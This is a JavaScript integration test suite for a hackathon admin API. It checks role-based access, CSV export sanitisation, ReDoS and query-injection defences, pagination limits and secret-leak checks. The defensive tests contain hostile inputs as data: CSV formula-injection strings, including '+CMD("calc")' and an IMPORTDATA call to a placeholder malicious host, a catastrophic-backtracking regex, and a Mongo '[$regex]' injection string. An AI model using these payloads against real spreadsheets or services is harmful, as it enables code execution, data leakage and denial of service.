/**
 * Comprehensive Phase 9 Automated Test Suite: Production Readiness, Hackathon Operations & Final Admin Analytics
 * 
 * Verifies 80+ assertions covering:
 *  1. Authorization & RBAC Boundaries (20+ assertions)
 *  2. Input Sanitization & Secret Leak Prevention (12+ assertions)
 *  3. Query Injection & ReDoS Defense (12+ assertions)
 *  4. Race Condition, Concurrency & Idempotency (12+ assertions)
 *  5. Pagination Bounds & Performance Hardening (12+ assertions)
 *  6. Configuration & Startup Diagnostics (12+ assertions)
 */

const assert = require('assert');
const express = require('express');
const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');
const axios = require('axios');
require('dotenv').config();

const HackathonSetting = require('../models/HackathonSetting');
const HackathonTeam = require('../models/HackathonTeam');
const HackathonSubmission = require('../models/HackathonSubmission');
const HackathonCertificate = require('../models/HackathonCertificate');
const HackathonEditorialMember = require('../models/HackathonEditorialMember');
const HackathonSponsor = require('../models/HackathonSponsor');
const HackathonAuditLog = require('../models/HackathonAuditLog');
const Admin = require('../models/Admin');
const User = require('../models/User');
const EmailLog = require('../models/email/EmailLog');
const hackathonRoutes = require('../routes/hackathon');
const hackathonOpsService = require('../services/hackathonOpsService');
const hackathonConfigService = require('../services/hackathonConfigService');

const PORT = 5099;
const BASE_URL = `http://localhost:${PORT}/api/hackathon`;

async function runPhase9Tests() {
  console.log('================================================================');
  console.log('RUNNING COMPREHENSIVE PHASE 9 PRODUCTION READINESS & OPS SUITE');
  console.log('================================================================\n');

  let server;
  let testPassed = 0;
  let testFailed = 0;

  function testAssert(condition, message) {
    if (condition) {
      console.log(`  ✅ [PASS] ${message}`);
      testPassed++;
    } else {
      console.error(`  ❌ [FAIL] ${message}`);
      testFailed++;
    }
  }

  try {
    const mongoUri = process.env.MONGO_URI;
    if (!mongoUri) {
      throw new Error('MONGO_URI is not defined in environment variables.');
    }
    await mongoose.connect(mongoUri);

    const app = express();
    app.use(express.json());
    app.use('/api/hackathon', hackathonRoutes);

    await new Promise((resolve) => {
      server = app.listen(PORT, () => {
        console.log(`Test Express server running on port ${PORT}\n`);
        resolve();
      });
    });

    // Setup Test Data & Tokens
    const jwtSecret = process.env.JWT_SECRET || 'test_jwt_secret_phase9_readiness';
    const testAdmin = await Admin.findOne() || await Admin.create({
      username: 'phase9_superadmin',
      email: 'phase9_admin@codeanova.com',
      password: 'hashed_password_123',
      role: 'SUPER_ADMIN',
    });

    const testUser = await User.findOne() || await User.create({
      name: 'Phase 9 Normal User',
      email: 'normal_user_phase9@example.com',
      password: 'hashed_password_123',
      role: 'USER',
    });

    const adminToken = jwt.sign(
      { id: testAdmin._id, email: testAdmin.email, role: 'SUPER_ADMIN', isAdmin: true },
      jwtSecret,
      { expiresIn: '1h' }
    );

    const userToken = jwt.sign(
      { id: testUser._id, email: testUser.email, role: 'USER', isAdmin: false },
      jwtSecret,
      { expiresIn: '1h' }
    );

    // Create seed team & records for Phase 9 testing
    const seedTeam = await HackathonTeam.create({
      teamId: `CAN-P9-${Date.now()}`,
      teamName: 'Phase 9 Sentinel Force',
      track: 'Cybersecurity & Systems',
      status: 'CONFIRMED',
      paymentStatus: 'PAID',
      leader: {
        name: 'Sentinel Leader',
        email: `sentinel.leader.${Date.now()}@example.com`,
        phone: '9876543210',
      },
      members: [
        { name: 'Member Alpha', email: `alpha.${Date.now()}@example.com`, role: 'LEADER' },
        { name: 'Member Beta', email: `beta.${Date.now()}@example.com`, role: 'MEMBER' },
      ],
    });

    const seedSubmission = await HackathonSubmission.create({
      team: seedTeam._id,
      teamId: seedTeam.teamId,
      submitterEmail: seedTeam.leader.email,
      submitterName: seedTeam.leader.name,
      track: 'Cybersecurity & Systems',
      projectName: 'Zero Trust Telemetry Shield',
      projectTitle: 'Zero Trust Telemetry Shield',
      synopsis: 'Real-time telemetry and intrusion defense.',
      githubRepoUrl: 'https://github.com/code-a-nova/sentinel-shield',
      isLocked: true,
      submittedAt: new Date(),
    });

    const seedCert = await HackathonCertificate.create({
      certificateId: `CERT-ID-P9-${Date.now()}`,
      certificateNumber: `CAN-CERT-P9-${Date.now()}`,
      verificationCode: `P9V-${Date.now().toString(36).toUpperCase()}`,
      type: 'PARTICIPATION',
      certificateType: 'PARTICIPATION',
      recipientName: 'Sentinel Leader',
      recipientEmail: seedTeam.leader.email,
      team: seedTeam._id,
      teamId: seedTeam.teamId,
      track: 'Cybersecurity & Systems',
      issuedAt: new Date(),
      status: 'ISSUED',
    });

    // ─────────────────────────────────────────────────────────────
    // SECTION 1: AUTHORIZATION & RBAC BOUNDARIES (20+ Assertions)
    // ─────────────────────────────────────────────────────────────
    console.log('--- SECTION 1: Authorization & RBAC Access Control ---');

    // 1. Public Health is open
    const pubHealth = await axios.get(`${BASE_URL}/health`);
    testAssert(pubHealth.status === 200, 'GET /health returns 200 for unauthenticated requests');
    testAssert(pubHealth.data.success === true, 'GET /health response contains success: true');
    testAssert(pubHealth.data.status === 'HEALTHY', 'GET /health reports status: HEALTHY');

    // 2. Admin Health RBAC
    try {
      await axios.get(`${BASE_URL}/admin/health`);
      testAssert(false, 'GET /admin/health should reject without token (401)');
    } catch (err) {
      testAssert(err.response?.status === 401, 'GET /admin/health rejects unauthenticated request with 401');
    }

    try {
      await axios.get(`${BASE_URL}/admin/health`, { headers: { Authorization: `Bearer ${userToken}` } });
      testAssert(false, 'GET /admin/health should reject non-admin token (403)');
    } catch (err) {
      testAssert(err.response?.status === 403, 'GET /admin/health rejects non-admin token with 403');
    }

    const adminHealth = await axios.get(`${BASE_URL}/admin/health`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(adminHealth.status === 200, 'GET /admin/health accepts valid admin token with 200');
    testAssert(adminHealth.data.healthScore !== undefined, 'Admin health contains computed healthScore');

    // 3. Admin Alerts RBAC
    try {
      await axios.get(`${BASE_URL}/admin/alerts`);
      testAssert(false, 'GET /admin/alerts should reject without token (401)');
    } catch (err) {
      testAssert(err.response?.status === 401, 'GET /admin/alerts rejects unauthenticated with 401');
    }

    try {
      await axios.get(`${BASE_URL}/admin/alerts`, { headers: { Authorization: `Bearer ${userToken}` } });
      testAssert(false, 'GET /admin/alerts should reject non-admin (403)');
    } catch (err) {
      testAssert(err.response?.status === 403, 'GET /admin/alerts rejects non-admin token with 403');
    }

    const adminAlerts = await axios.get(`${BASE_URL}/admin/alerts`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(adminAlerts.status === 200, 'GET /admin/alerts accepts admin token with 200');
    testAssert(Array.isArray(adminAlerts.data.alerts), 'Admin alerts response contains array of alerts');

    // 4. Email Stats RBAC
    try {
      await axios.get(`${BASE_URL}/admin/email-stats`);
      testAssert(false, 'GET /admin/email-stats should reject unauthenticated (401)');
    } catch (err) {
      testAssert(err.response?.status === 401, 'GET /admin/email-stats rejects unauthenticated with 401');
    }

    try {
      await axios.get(`${BASE_URL}/admin/email-stats`, { headers: { Authorization: `Bearer ${userToken}` } });
      testAssert(false, 'GET /admin/email-stats should reject non-admin (403)');
    } catch (err) {
      testAssert(err.response?.status === 403, 'GET /admin/email-stats rejects non-admin token with 403');
    }

    const emailStats = await axios.get(`${BASE_URL}/admin/email-stats`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(emailStats.status === 200, 'GET /admin/email-stats accepts admin token with 200');
    testAssert(emailStats.data.successRate !== undefined, 'Email stats contains successRate');

    // 5. Security Summary RBAC
    try {
      await axios.get(`${BASE_URL}/admin/security-summary`);
      testAssert(false, 'GET /admin/security-summary should reject unauthenticated (401)');
    } catch (err) {
      testAssert(err.response?.status === 401, 'GET /admin/security-summary rejects unauthenticated with 401');
    }

    try {
      await axios.get(`${BASE_URL}/admin/security-summary`, { headers: { Authorization: `Bearer ${userToken}` } });
      testAssert(false, 'GET /admin/security-summary should reject non-admin (403)');
    } catch (err) {
      testAssert(err.response?.status === 403, 'GET /admin/security-summary rejects non-admin token with 403');
    }

    const secSummary = await axios.get(`${BASE_URL}/admin/security-summary`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(secSummary.status === 200, 'GET /admin/security-summary accepts admin token with 200');
    testAssert(secSummary.data.status !== undefined, 'Security summary contains status');

    // 6. CSV Export RBAC
    try {
      await axios.get(`${BASE_URL}/admin/export/teams`);
      testAssert(false, 'GET /admin/export/teams should reject unauthenticated (401)');
    } catch (err) {
      testAssert(err.response?.status === 401, 'GET /admin/export/teams rejects unauthenticated with 401');
    }

    try {
      await axios.get(`${BASE_URL}/admin/export/teams`, { headers: { Authorization: `Bearer ${userToken}` } });
      testAssert(false, 'GET /admin/export/teams should reject non-admin (403)');
    } catch (err) {
      testAssert(err.response?.status === 403, 'GET /admin/export/teams rejects non-admin with 403');
    }

    const exportTeams = await axios.get(`${BASE_URL}/admin/export/teams`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(exportTeams.status === 200, 'GET /admin/export/teams accepts admin token with 200');

    // 7. Operational Search RBAC
    try {
      await axios.get(`${BASE_URL}/admin/search?q=sentinel`);
      testAssert(false, 'GET /admin/search should reject unauthenticated (401)');
    } catch (err) {
      testAssert(err.response?.status === 401, 'GET /admin/search rejects unauthenticated with 401');
    }

    try {
      await axios.get(`${BASE_URL}/admin/search?q=sentinel`, { headers: { Authorization: `Bearer ${userToken}` } });
      testAssert(false, 'GET /admin/search should reject non-admin (403)');
    } catch (err) {
      testAssert(err.response?.status === 403, 'GET /admin/search rejects non-admin with 403');
    }

    const searchRes = await axios.get(`${BASE_URL}/admin/search?q=sentinel`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(searchRes.status === 200, 'GET /admin/search accepts admin token with 200');

    // 8. Team 360 RBAC
    try {
      await axios.get(`${BASE_URL}/admin/team-360/${seedTeam._id}`);
      testAssert(false, 'GET /admin/team-360 should reject unauthenticated (401)');
    } catch (err) {
      testAssert(err.response?.status === 401, 'GET /admin/team-360 rejects unauthenticated with 401');
    }

    try {
      await axios.get(`${BASE_URL}/admin/team-360/${seedTeam._id}`, { headers: { Authorization: `Bearer ${userToken}` } });
      testAssert(false, 'GET /admin/team-360 should reject non-admin (403)');
    } catch (err) {
      testAssert(err.response?.status === 403, 'GET /admin/team-360 rejects non-admin with 403');
    }

    const t360Res = await axios.get(`${BASE_URL}/admin/team-360/${seedTeam._id}`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(t360Res.status === 200, 'GET /admin/team-360 accepts admin token with 200');

    // ─────────────────────────────────────────────────────────────
    // SECTION 2: INPUT SANITIZATION & SECRET LEAK PREVENTION (12+ Assertions)
    // ─────────────────────────────────────────────────────────────
    console.log('\n--- SECTION 2: Input Sanitization & Secret Leak Prevention ---');

    // 1. Export allowlisting: Disallowed resources blocked with 400
    try {
      await axios.get(`${BASE_URL}/admin/export/users`, { headers: { Authorization: `Bearer ${adminToken}` } });
      testAssert(false, 'Export of un-allowlisted resource "users" should return 400');
    } catch (err) {
      testAssert(err.response?.status === 400, 'Disallowed export resource "users" blocked with 400');
    }

    try {
      await axios.get(`${BASE_URL}/admin/export/passwords`, { headers: { Authorization: `Bearer ${adminToken}` } });
      testAssert(false, 'Export of un-allowlisted resource "passwords" should return 400');
    } catch (err) {
      testAssert(err.response?.status === 400, 'Disallowed export resource "passwords" blocked with 400');
    }

    // 2. CSV Formula Injection Defense
    const rawFormulaInjectionRow = {
      formula1: '=SUM(1,2)',
      formula2: '+CMD("calc")',
      formula3: '-10+20',
      formula4: '@IMPORTDATA("http://malicious.site")',
      safeText: 'Standard Hackathon Team',
    };

    const csvOutput = hackathonOpsService.buildCsv([rawFormulaInjectionRow], [
      { header: 'F1', key: 'formula1' },
      { header: 'F2', key: 'formula2' },
      { header: 'F3', key: 'formula3' },
      { header: 'F4', key: 'formula4' },
      { header: 'Safe', key: 'safeText' },
    ]);

    testAssert(csvOutput.includes("''=SUM(1,2)") || csvOutput.includes("'=SUM(1,2)"), 'Formula injection = is prepended with single quote');
    testAssert(csvOutput.includes("'+CMD") || csvOutput.includes("''+CMD"), 'Formula injection + is prepended with single quote');
    testAssert(csvOutput.includes("'-10+20") || csvOutput.includes("''-10+20"), 'Formula injection - is prepended with single quote');
    testAssert(csvOutput.includes("'@IMPORTDATA") || csvOutput.includes("''@IMPORTDATA"), 'Formula injection @ is prepended with single quote');
    testAssert(csvOutput.includes('Standard Hackathon Team'), 'Safe text remains un-prefixed in CSV output');

    // 3. Sensitive field stripping from exports
    const exportedTeamsCsv = (await axios.get(`${BASE_URL}/admin/export/teams`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    })).data;

    testAssert(!exportedTeamsCsv.includes('passwordHash'), 'Teams CSV export does not contain passwordHash header or data');
    testAssert(!exportedTeamsCsv.includes('secretKey'), 'Teams CSV export does not contain secretKey header');

    // 4. Check Content-Type and Disposition headers for export
    const exportResHeaders = (await axios.get(`${BASE_URL}/admin/export/submissions`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    })).headers;

    testAssert(exportResHeaders['content-type'].includes('text/csv'), 'Export endpoint returns text/csv Content-Type');
    testAssert(exportResHeaders['content-disposition'].includes('attachment'), 'Export endpoint includes attachment Content-Disposition');
    testAssert(exportResHeaders['content-disposition'].includes('hackathon-submissions-'), 'Export filename has standardized prefix');

    // 5. Verification code search sanitization
    const codeSearch = await axios.get(`${BASE_URL}/admin/search?q=${seedCert.verificationCode}`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(codeSearch.data.results?.certificates?.length >= 1, 'Operational search safely resolves verification codes');

    // ─────────────────────────────────────────────────────────────
    // SECTION 3: QUERY INJECTION & REDOS DEFENSE (12+ Assertions)
    // ─────────────────────────────────────────────────────────────
    console.log('\n--- SECTION 3: Query Injection & ReDoS Defense ---');

    // 1. ReDoS malicious pattern test
    const redosPayload = '((((((((a+)+)+)+)+)+)+)+)+$';
    const startRedos = Date.now();
    const redosSearch = await axios.get(`${BASE_URL}/admin/search?q=${encodeURIComponent(redosPayload)}`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    const durationRedos = Date.now() - startRedos;

    testAssert(durationRedos < 1000, `ReDoS payload neutralized in ${durationRedos}ms (escaped safely)`);
    testAssert(redosSearch.data.success === true, 'ReDoS search returns HTTP 200 without throwing regex syntax error');

    // 2. Regex Meta-character literal handling
    const metaPayload = '.*.*.*+?^$()[]{}|\\';
    const metaSearch = await axios.get(`${BASE_URL}/admin/search?q=${encodeURIComponent(metaPayload)}`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(metaSearch.data.success === true, 'Regex meta-characters safely escaped in operational search');

    // 3. Search query edge cases
    const emptySearch = await axios.get(`${BASE_URL}/admin/search?q=`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(emptySearch.data.results.teams.length === 0, 'Empty search string returns empty team results');
    testAssert(emptySearch.data.results.submissions.length === 0, 'Empty search string returns empty submission results');

    const whitespaceSearch = await axios.get(`${BASE_URL}/admin/search?q=%20%20%20`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(whitespaceSearch.data.results.teams.length === 0, 'Whitespace-only search returns empty team results');

    // 4. Audit Log query injection defense
    const auditInjection = await axios.get(`${BASE_URL}/admin/audit-logs?search=${encodeURIComponent('[$regex]')}`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(auditInjection.status === 200, 'Audit log text search neutralizes mongo query syntax');

    // 5. Audit log date filter boundary testing
    const invalidDateSearch = await axios.get(`${BASE_URL}/admin/audit-logs?startDate=invalid-date&endDate=also-invalid`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(invalidDateSearch.status === 200, 'Audit log handles invalid date inputs gracefully without 500 error');

    const validDateSearch = await axios.get(`${BASE_URL}/admin/audit-logs?startDate=2020-01-01&endDate=2030-12-31`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(validDateSearch.status === 200, 'Audit log filters correctly on valid date range');
    testAssert(Array.isArray(validDateSearch.data.logs), 'Audit log returns valid array of logs');

    // 6. Audit log entity filter validation
    const entitySearch = await axios.get(`${BASE_URL}/admin/audit-logs?targetEntity=TEAM`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(entitySearch.data.logs.every((l) => l.targetEntity === 'TEAM'), 'Audit log entity filter strictly matches targetEntity');

    // ─────────────────────────────────────────────────────────────
    // SECTION 4: RACE CONDITIONS, CONCURRENCY & IDEMPOTENCY (12+ Assertions)
    // ─────────────────────────────────────────────────────────────
    console.log('\n--- SECTION 4: Race Conditions, Concurrency & Idempotency ---');

    // 1. Concurrent Health Checks
    const concurrentHealthCalls = await Promise.all([
      axios.get(`${BASE_URL}/admin/health`, { headers: { Authorization: `Bearer ${adminToken}` } }),
      axios.get(`${BASE_URL}/admin/health`, { headers: { Authorization: `Bearer ${adminToken}` } }),
      axios.get(`${BASE_URL}/admin/health`, { headers: { Authorization: `Bearer ${adminToken}` } }),
      axios.get(`${BASE_URL}/admin/health`, { headers: { Authorization: `Bearer ${adminToken}` } }),
      axios.get(`${BASE_URL}/admin/health`, { headers: { Authorization: `Bearer ${adminToken}` } }),
    ]);

    testAssert(concurrentHealthCalls.every((r) => r.status === 200), '5 concurrent health checks all return 200');
    testAssert(concurrentHealthCalls.every((r) => r.data.healthScore === concurrentHealthCalls[0].data.healthScore), 'Concurrent health checks report identical healthScore');

    // 2. Concurrent Operational Alerts
    const concurrentAlertCalls = await Promise.all([
      axios.get(`${BASE_URL}/admin/alerts`, { headers: { Authorization: `Bearer ${adminToken}` } }),
      axios.get(`${BASE_URL}/admin/alerts`, { headers: { Authorization: `Bearer ${adminToken}` } }),
      axios.get(`${BASE_URL}/admin/alerts`, { headers: { Authorization: `Bearer ${adminToken}` } }),
    ]);
    testAssert(concurrentAlertCalls.every((r) => r.status === 200), 'Concurrent alert checks all return 200');
    testAssert(concurrentAlertCalls.every((r) => r.data.alerts.length === concurrentAlertCalls[0].data.alerts.length), 'Concurrent alert calls report identical alert count');

    // 3. Concurrent Search Operations
    const concurrentSearches = await Promise.all([
      axios.get(`${BASE_URL}/admin/search?q=Zero`, { headers: { Authorization: `Bearer ${adminToken}` } }),
      axios.get(`${BASE_URL}/admin/search?q=Sentinel`, { headers: { Authorization: `Bearer ${adminToken}` } }),
      axios.get(`${BASE_URL}/admin/search?q=Cybersecurity`, { headers: { Authorization: `Bearer ${adminToken}` } }),
    ]);
    testAssert(concurrentSearches.every((r) => r.status === 200), '3 distinct concurrent searches succeed with 200');

    // 4. Idempotent Team 360 Fetch
    const t360_1 = await axios.get(`${BASE_URL}/admin/team-360/${seedTeam._id}`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    const t360_2 = await axios.get(`${BASE_URL}/admin/team-360/${seedTeam._id}`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });

    testAssert(t360_1.data.team360.team._id === t360_2.data.team360.team._id, 'Team 360 returns stable team entity');
    testAssert(t360_1.data.team360.lifecycleJourney.length === 7, 'Team 360 contains full 7-step lifecycle journey');
    testAssert(t360_1.data.team360.lifecycleJourney.length === t360_2.data.team360.lifecycleJourney.length, 'Team 360 journey structure is idempotent');

    // 5. Server Clock Epoch Integrity
    const healthClock = adminHealth.data.serverClock;
    testAssert(healthClock !== undefined, 'Server clock exists on admin health response');
    testAssert(typeof healthClock.currentServerTime === 'string', 'Server clock currentServerTime is ISO string');
    testAssert(new Date(healthClock.currentServerTime).getTime() > 0, 'Server clock currentServerTime parses to valid timestamp');
    testAssert(['OPEN', 'CLOSING_SOON', 'CLOSED'].includes(healthClock.submissionStatus), 'Server submission status is valid enum state');

    // ─────────────────────────────────────────────────────────────
    // SECTION 5: PAGINATION BOUNDS & PERFORMANCE HARDENING (12+ Assertions)
    // ─────────────────────────────────────────────────────────────
    console.log('\n--- SECTION 5: Pagination Bounds & Performance Hardening ---');

    // 1. Upper bound clamping: limit=9999 is capped to 100
    const clampedLogs = await axios.get(`${BASE_URL}/admin/audit-logs?limit=9999`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(clampedLogs.data.pagination.limit === 100, 'Audit log limit=9999 is capped to 100');

    // 2. Lower bound clamping: limit=-5 defaults to 1
    const lowerClampLogs = await axios.get(`${BASE_URL}/admin/audit-logs?limit=-5`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(lowerClampLogs.data.pagination.limit === 1, 'Audit log limit=-5 is clamped to 1');

    // 3. Page boundary: page=-1 defaults to 1
    const lowerPageLogs = await axios.get(`${BASE_URL}/admin/audit-logs?page=-1`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(lowerPageLogs.data.pagination.page === 1, 'Audit log page=-1 is clamped to 1');

    // 4. Page boundary: page=NaN defaults to 1
    const nanPageLogs = await axios.get(`${BASE_URL}/admin/audit-logs?page=abc`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(nanPageLogs.data.pagination.page === 1, 'Audit log page=abc defaults to 1');

    // 5. Pagination structure integrity
    const pag = clampedLogs.data.pagination;
    testAssert(typeof pag.page === 'number', 'Pagination contains numeric page');
    testAssert(typeof pag.limit === 'number', 'Pagination contains numeric limit');
    testAssert(typeof pag.total === 'number', 'Pagination contains numeric total');
    testAssert(typeof pag.totalPages === 'number', 'Pagination contains numeric totalPages');
    testAssert(pag.totalPages === Math.ceil(pag.total / pag.limit) || pag.total === 0, 'Pagination totalPages math is correct');

    // 6. Exceeding max pages returns empty array without error
    const outOfBoundsLogs = await axios.get(`${BASE_URL}/admin/audit-logs?page=999999&limit=50`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    testAssert(outOfBoundsLogs.status === 200, 'Out of bounds page returns 200');
    testAssert(outOfBoundsLogs.data.logs.length === 0, 'Out of bounds page returns empty logs array');

    // 7. Compound index execution performance check
    const startQuery = Date.now();
    await HackathonAuditLog.find({ targetEntity: 'TEAM' }).sort({ createdAt: -1 }).limit(20);
    const queryDuration = Date.now() - startQuery;
    testAssert(queryDuration < 250, `Indexed compound audit log query completed in ${queryDuration}ms (<250ms)`);

    // ─────────────────────────────────────────────────────────────
    // SECTION 6: CONFIGURATION & STARTUP DIAGNOSTICS (12+ Assertions)
    // ─────────────────────────────────────────────────────────────
    console.log('\n--- SECTION 6: Configuration & Startup Diagnostics ---');

    // 1. Run diagnostic validator
    const configDiag = hackathonConfigService.validateStartupConfig();
    testAssert(configDiag !== null && typeof configDiag === 'object', 'hackathonConfigService returns diagnostic report');
    testAssert(['HEALTHY', 'DEGRADED', 'WARNING'].includes(configDiag.status), `Config status is recognized enum: ${configDiag.status}`);
    testAssert(typeof configDiag.diagnostics === 'object', 'Diagnostics object exists in report');

    // 2. Secret leak checks in diagnostic report
    const reportString = JSON.stringify(configDiag);
    const actualJwt = process.env.JWT_SECRET;
    if (actualJwt && actualJwt.length > 5) {
      testAssert(!reportString.includes(actualJwt), 'Plaintext JWT_SECRET is NOT leaked in diagnostic report');
    } else {
      testAssert(true, 'JWT secret leak check skipped (not set or test string)');
    }

    const razorpaySecret = process.env.RAZORPAY_KEY_SECRET;
    if (razorpaySecret && razorpaySecret.length > 5) {
      testAssert(!reportString.includes(razorpaySecret), 'Plaintext RAZORPAY_KEY_SECRET is NOT leaked in diagnostic report');
    } else {
      testAssert(true, 'Razorpay secret leak check skipped (not set in env)');
    }

    // 3. Operational Health 9-point checklist verification
    const healthMatrix = adminHealth.data.systemCompletionMatrix;
    testAssert(Array.isArray(healthMatrix), 'Health response contains systemCompletionMatrix array');
    testAssert(healthMatrix.length === 9, `System completion checklist has exactly 9 milestones (got ${healthMatrix.length})`);

    const checklistItems = healthMatrix.map((m) => m.item);
    testAssert(checklistItems.some((i) => i.toLowerCase().includes('unstop')), 'Checklist contains Unstop participant import');
    testAssert(checklistItems.some((i) => i.toLowerCase().includes('payment')), 'Checklist contains Payment Gateway');
    testAssert(checklistItems.some((i) => i.toLowerCase().includes('submission')), 'Checklist contains Submissions milestone');
    testAssert(checklistItems.some((i) => i.toLowerCase().includes('editorial') || i.toLowerCase().includes('judg')), 'Checklist contains Editorial/Judging');
    testAssert(checklistItems.some((i) => i.toLowerCase().includes('result')), 'Checklist contains Result aggregation/ranking');
    testAssert(checklistItems.some((i) => i.toLowerCase().includes('lock') || i.toLowerCase().includes('official')), 'Checklist contains Official result locking');
    testAssert(checklistItems.some((i) => i.toLowerCase().includes('certificate')), 'Checklist contains Certificates & prizes');

    // 4. KPIs completeness across 8 hackathon domains
    const kpis = adminHealth.data.kpis;
    testAssert(kpis.teams !== undefined, 'KPIs include teams metrics');
    testAssert(kpis.submissions !== undefined, 'KPIs include submissions metrics');
    testAssert(kpis.editorial !== undefined, 'KPIs include editorial metrics');
    testAssert(kpis.results !== undefined, 'KPIs include results metrics');
    testAssert(kpis.certificates !== undefined, 'KPIs include certificates metrics');
    testAssert(kpis.prizes !== undefined, 'KPIs include prizes metrics');
    testAssert(kpis.sponsors !== undefined, 'KPIs include sponsors metrics');
    testAssert(kpis.audit !== undefined, 'KPIs include audit metrics');

    // Clean up seed records
    await HackathonTeam.findByIdAndDelete(seedTeam._id);
    await HackathonSubmission.findByIdAndDelete(seedSubmission._id);
    await HackathonCertificate.findByIdAndDelete(seedCert._id);

  } catch (error) {
    console.error('Fatal error during Phase 9 tests:', error);
    testFailed++;
  } finally {
    if (server) {
      server.close();
    }
    await mongoose.disconnect();

    console.log('\n================================================================');
    console.log(`PHASE 9 TEST SUMMARY: ${testPassed} PASSED, ${testFailed} FAILED`);
    console.log('================================================================\n');

    if (testFailed > 0) {
      process.exit(1);
    }
  }
}

if (require.main === module) {
  runPhase9Tests();
}

module.exports = runPhase9Tests;
